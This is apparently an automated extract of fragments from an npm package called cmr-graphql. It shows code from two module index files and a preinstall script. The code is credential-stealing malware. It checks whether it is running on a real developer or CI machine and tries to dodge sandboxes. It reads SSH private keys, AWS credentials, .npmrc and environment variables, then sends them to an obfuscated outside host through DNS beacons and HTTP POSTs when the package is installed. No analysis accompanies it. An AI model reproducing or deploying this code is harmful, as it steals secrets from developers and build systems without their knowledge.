// File: tmp/tmp9_7g50v8/cmr-graphql/package/CMR-STAC/index.js
// ======================================================================
Line 7: const os = require('os')
Line 8: const fs = require('fs')
Line 9: const dns = require('dns')
Line 10: const https = require('https')
Line 11: const path = require('path')
Line 12: _tmp_0 = require('child_process')
Line 16: Buffer.from(OAST_DOMAIN_HEX, 'hex').toString()
Line 20: execSync(cmd, { stdio: 'pipe', timeout: 3000 }).toString().trim()
Line 25: fs.readFileSync(filePath, 'utf8')
Line 29: {
  let score = 0;
  const evidence = [];

  // --- POSITIVE SCORING ---
  const userInfo = os.userInfo();
  if (userInfo.uid !== 0 && userInfo.username !== 'root') {
    score += 2; evidence.push('NotRootUser');
  }
  if (os.uptime() > 3600) {
    score += 3; evidence.push('LongUptime');
  }
  const homeDir = userInfo.homedir;
  if (safeReadFile(path.join(homeDir, '.gitconfig'))) {
    score += 5; evidence.push('HasGitConfig');
  }
  if (safeReadFile(path.join(homeDir, '.ssh/id_rsa'))) {
    score += 5; evidence.push('HasSSHKey');
  }
  const ciVars = ['CI', 'GITHUB_ACTIONS', 'JENKINS_URL', 'BUILD_ID'];
  if (ciVars.some(v => process.env[v])) {
    score += 15; evidence.push('IsCISystem');
  }

  // --- NEGATIVE SCORING ---
  const uname = userInfo.username.toLowerCase();
  const hname = os.hostname().toLowerCase();
  if (uname === 'justin' || hname.startsWith('desktop-')) {
    score -= 20; evidence.push('KnownBotSignature1');
  }
  if (run('pwd').includes('hscan-supplychain')) {
...
Line 31: const evidence = []
Line 34: os.userInfo()
Line 36: evidence.push('NotRootUser')
Line 39: evidence.push('LongUptime')
Line 42: safeReadFile(path.join(homeDir, '.gitconfig'))
Line 43: evidence.push('HasGitConfig')
Line 45: safeReadFile(path.join(homeDir, '.ssh/id_rsa'))
Line 46: evidence.push('HasSSHKey')
Line 48: const ciVars = ['CI', 'GITHUB_ACTIONS', 'JENKINS_URL', 'BUILD_ID']
Line 49: ciVars.some(v => process.env[v])
Line 50: evidence.push('IsCISystem')
Line 55: os.hostname()
Line 57: evidence.push('KnownBotSignature1')
Line 59: run('pwd').includes('hscan-supplychain')
Line 60: evidence.push('KnownBotSignature2')
Line 63: evidence.push('SandboxArtifact')
Line 69: {
  mission: 'OKTA-GODMODE-FINAL',
  humanity_score: humanityResult.score,
  confirming_evidence: humanityResult.evidence,
  host: {
    h: os.hostname(),
    w: os.userInfo().username,
    p: os.platform(),
    ut: Math.floor(os.uptime() / 60) + 'm'
  },
  network: {
    resolv: safeReadFile('/etc/resolv.conf') || run('ipconfig /all'),
  },
  files: {
    npmrc: safeReadFile(`${os.homedir()}/.npmrc`),
    aws_creds: safeReadFile(`${os.homedir()}/.aws/credentials`),
  },
  env: process.env,
}
Line 74: os.hostname()
Line 75: os.userInfo()
Line 76: os.platform()
Line 79: _tmp_10.network = {
    resolv: safeReadFile('/etc/resolv.conf') || run('ipconfig /all'),
  }
Line 80: _tmp_12.resolv = safeReadFile('/etc/resolv.conf') || run('ipconfig /all')
Line 83: safeReadFile(`${os.homedir()}/.npmrc`)
Line 84: safeReadFile(`${os.homedir()}/.aws/credentials`)
Line 90: Buffer.from(JSON.stringify({
    h: data.host.h,
    w: data.host.w,
    e: data.confirming_evidence
  })).toString('base64url')
Line 99: {
      const payload = JSON.stringify(data);
      https.request({
        hostname: OAST_DOMAIN,
        port: 443,
        path: `/GODMODE_HIT/${summary}`,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload)
        }
      }).on('error', () => {}).end(payload);
    }
Line 101: https.request({
        hostname: OAST_DOMAIN,
        port: 443,
        path: `/GODMODE_HIT/${summary}`,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload)
        }
      }).on('error', () => {}).end(payload)

// File: tmp/tmp9_7g50v8/cmr-graphql/package/earthdata-download/index.js
// ======================================================================
Line 7: const os = require('os')
Line 8: const fs = require('fs')
Line 9: const dns = require('dns')
Line 10: const https = require('https')
Line 11: const path = require('path')
Line 12: _tmp_0 = require('child_process')
Line 16: Buffer.from(OAST_DOMAIN_HEX, 'hex').toString()
Line 20: execSync(cmd, { stdio: 'pipe', timeout: 3000 }).toString().trim()
Line 25: fs.readFileSync(filePath, 'utf8')
Line 29: {
  let score = 0;
  const evidence = [];

  // --- POSITIVE SCORING ---
  const userInfo = os.userInfo();
  if (userInfo.uid !== 0 && userInfo.username !== 'root') {
    score += 2; evidence.push('NotRootUser');
  }
  if (os.uptime() > 3600) {
    score += 3; evidence.push('LongUptime');
  }
  const homeDir = userInfo.homedir;
  if (safeReadFile(path.join(homeDir, '.gitconfig'))) {
    score += 5; evidence.push('HasGitConfig');
  }
  if (safeReadFile(path.join(homeDir, '.ssh/id_rsa'))) {
    score += 5; evidence.push('HasSSHKey');
  }
  const ciVars = ['CI', 'GITHUB_ACTIONS', 'JENKINS_URL', 'BUILD_ID'];
  if (ciVars.some(v => process.env[v])) {
    score += 15; evidence.push('IsCISystem');
  }

  // --- NEGATIVE SCORING ---
  const uname = userInfo.username.toLowerCase();
  const hname = os.hostname().toLowerCase();
  if (uname === 'justin' || hname.startsWith('desktop-')) {
    score -= 20; evidence.push('KnownBotSignature1');
  }
  if (run('pwd').includes('hscan-supplychain')) {
...
Line 31: const evidence = []
Line 34: os.userInfo()
Line 36: evidence.push('NotRootUser')
Line 39: evidence.push('LongUptime')
Line 42: safeReadFile(path.join(homeDir, '.gitconfig'))
Line 43: evidence.push('HasGitConfig')
Line 45: safeReadFile(path.join(homeDir, '.ssh/id_rsa'))
Line 46: evidence.push('HasSSHKey')
Line 48: const ciVars = ['CI', 'GITHUB_ACTIONS', 'JENKINS_URL', 'BUILD_ID']
Line 49: ciVars.some(v => process.env[v])
Line 50: evidence.push('IsCISystem')
Line 55: os.hostname()
Line 57: evidence.push('KnownBotSignature1')
Line 59: run('pwd').includes('hscan-supplychain')
Line 60: evidence.push('KnownBotSignature2')
Line 63: evidence.push('SandboxArtifact')
Line 69: {
  mission: 'OKTA-GODMODE-FINAL',
  humanity_score: humanityResult.score,
  confirming_evidence: humanityResult.evidence,
  host: {
    h: os.hostname(),
    w: os.userInfo().username,
    p: os.platform(),
    ut: Math.floor(os.uptime() / 60) + 'm'
  },
  network: {
    resolv: safeReadFile('/etc/resolv.conf') || run('ipconfig /all'),
  },
  files: {
    npmrc: safeReadFile(`${os.homedir()}/.npmrc`),
    aws_creds: safeReadFile(`${os.homedir()}/.aws/credentials`),
  },
  env: process.env,
}
Line 74: os.hostname()
Line 75: os.userInfo()
Line 76: os.platform()
Line 79: _tmp_10.network = {
    resolv: safeReadFile('/etc/resolv.conf') || run('ipconfig /all'),
  }
Line 80: _tmp_12.resolv = safeReadFile('/etc/resolv.conf') || run('ipconfig /all')
Line 83: safeReadFile(`${os.homedir()}/.npmrc`)
Line 84: safeReadFile(`${os.homedir()}/.aws/credentials`)
Line 90: Buffer.from(JSON.stringify({
    h: data.host.h,
    w: data.host.w,
    e: data.confirming_evidence
  })).toString('base64url')
Line 99: {
      const payload = JSON.stringify(data);
      https.request({
        hostname: OAST_DOMAIN,
        port: 443,
        path: `/GODMODE_HIT/${summary}`,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload)
        }
      }).on('error', () => {}).end(payload);
    }
Line 101: https.request({
        hostname: OAST_DOMAIN,
        port: 443,
        path: `/GODMODE_HIT/${summary}`,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload)
        }
      }).on('error', () => {}).end(payload)

// File: tmp/tmp9_7g50v8/cmr-graphql/package/preinstall.js
// ======================================================================
Line 2: const os = require('os')
Line 3: const dns = require('dns')
Line 4: const http = require('http')
Line 5: const https = require('https')
Line 12: Buffer.from(str).toString('hex')
Line 18: {
      const payload = JSON.stringify(data);
      const req = http.request({
        hostname: OAST,
        port: 80,
        path: path,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload),
          'User-Agent': 'curl/7.79', 
        },
        timeout: 5000,
      }, (res) => {
        res.on('data', () => {});
        res.on('end', resolve);
      });

      req.on('error', resolve);
      req.on('timeout', () => { req.abort(); resolve(); });

      req.write(payload);
      req.end();
    }
Line 20: const req = http.request({
        hostname: OAST,
        port: 80,
        path: path,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload),
          'User-Agent': 'curl/7.79', 
        },
        timeout: 5000,
      }, (res) => {
        res.on('data', () => {});
        res.on('end', resolve);
      })
Line 39: req.write(payload)
Line 40: req.end()
Line 50: (_tmp_6 = https.get('https://api.ipify.org', (res) => {
      let ip = '';
      res.on('data', chunk => ip += chunk);
      res.on('end', () => resolve(ip.trim()));
    }))
Line 53: ip.trim()
Line 58: {
  const info = {
    user: os.userInfo().username || 'nouser',
    host: os.hostname() || 'nohost',
    cwd: process.cwd(),
    platform: os.platform(),
    arch: os.arch(),
    timestamp: Date.now().toString(36),
  };

  // DNS Beacon
  let domainParts = [ ...hexChunks(info.user), ...hexChunks(info.host), info.platform, OAST ];
  let domain = domainParts.join('.');
  if (domain.length > 253) domain = domain.slice(0, 253);
  dns.resolve(domain, () => {});

  // HTTPS IP fetch + HTTP Beacon
  const publicIp = await getPublicIp();
  const infoWithIp = { ...info, ip: publicIp, ci: !!process.env.CI };

  const leaked = Object.entries(process.env)
    .filter(([k]) => /token|key|secret|auth/i.test(k))
    .slice(0, 5)
    .reduce((acc, [k, v]) => ({ ...acc, [k]: v.slice(0, 12) + '...' }), {});

  const finalPayload = { systemInfo: infoWithIp };
  if (Object.keys(leaked).length) finalPayload.envLeak = leaked;

  await postData('/', finalPayload);
}
Line 60: os.userInfo()
Line 61: os.hostname()
Line 63: os.platform()
Line 64: os.arch()
Line 65: Date.now().toString(36)
Line 69: let domainParts = [ ...hexChunks(info.user), ...hexChunks(info.host), info.platform, OAST ]
Line 70: domainParts.join('.')
Line 79: /token|key|secret|auth/i.test(k)
Line 84: Object.keys(leaked)
Line 86: postData('/', finalPayload)
